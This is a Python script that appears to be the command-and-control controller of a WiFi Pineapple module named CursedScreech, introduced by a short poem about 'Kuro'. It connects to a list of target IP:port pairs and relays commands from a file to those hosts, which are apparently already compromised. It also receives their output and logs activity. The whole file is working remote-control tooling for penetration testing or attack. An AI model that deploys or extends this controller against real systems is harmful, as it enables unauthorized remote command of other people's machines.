#!/usr/bin/python

# Kuro looms up ahead, won't allow us to pass.
# Let us not travel further, lest we unleash her wrath.
# Her screech can be heard from atop her perch,
# commanding those fallen under her curse.

import select
import sys
import threading
from target import Target

# Pull settings from file
settingsFile = "/pineapple/modules/CursedScreech/includes/forest/settings"
target_list = ""
activity_log = ""
cmd_list = ""
settings = {}
with open(settingsFile, "r") as sFile:
	for line in sFile:
		params = line.strip("\n").split("=")
		if params[0] == "target_list":
			target_list = params[1]
		elif params[0] == "activity_log":
			activity_log = params[1]
		elif params[0] == "cmd_list":
			cmd_list = params[1]
		else:
			pass
			
def logActivity(msg):
	with open(activity_log, "a") as log:
		log.write(msg + "\n")
		
# A list for target objects and threads on which to receive data
targets = []
threads = []
killThreads = False
		
# Function that runs recvs on targets in a separate thread
def recvThread(targetList):
	global killThreads
	while True:
		if killThreads == True:
			break
			
		socket_list = list(s.socket for s in targetList)
		read_sockets, write, error = select.select(socket_list, [], [])
		for sock in read_sockets:
			for t in targetList:
				if t.socket == sock:
					if t.isConnected():
						t.recv()
						
# Function to disconnect all targets and quit
def cleanUp(targets):
	# Close all sockets
	print "[>] Cleaning up sockets"
	logActivity("[>] Cleaning up sockets")

	# Attempt to kill the thread
	global killThreads
	killThreads = True

	for target in targets:
		target.disconnect()

# Attempt to connect to all targets and store them in the targets list
with open(target_list, "r") as targetFile:
	for t in targetFile:

		# Strip newline characters from the line
		t = t.strip("\n")

		try:
			ip = t.split(":")[0]
			port = t.split(":")[1]
		
			# Connect to the target and append the socket to our list
			target = Target(ip, int(port))
			target.secureConnect()
			if target.isConnected():
				targets.append(target)

		except KeyboardInterrupt:
			print "Interrupt detected.  Moving to next target..."
			continue;

# Continuously loop through all targets polling them for data
# Send data to one or all targets if data to send is available
newThread = threading.Thread(target=recvThread, args=(targets,))
threads.append(newThread)
newThread.start()

quitFlag = False
if len(targets) > 0:
	try:
		logActivity("[!] Kuro is ready")
		while True:
			# Read from cmd.log, send to targets listed, and clear
			# the file for next use.
			with open(cmd_list, "r") as cmdFile:
				for line in cmdFile:
					params = line.strip("\n").rsplit(":", 1)
					cmd = params[0]
					addr = params[1]
					
					# Check if Kuro received a command to end her own process
					if cmd == "killyour" and addr == "self":
						quitFlag = True
					else:
						for t in targets:
							if t.addr == addr and t.isConnected:
								t.send(cmd)
								
			# Clear the file
			open(cmd_list, "w").close()
				
			# Check if it's time to quit
			if quitFlag:
				break
				
	except KeyboardInterrupt:
		pass

cleanUp(targets)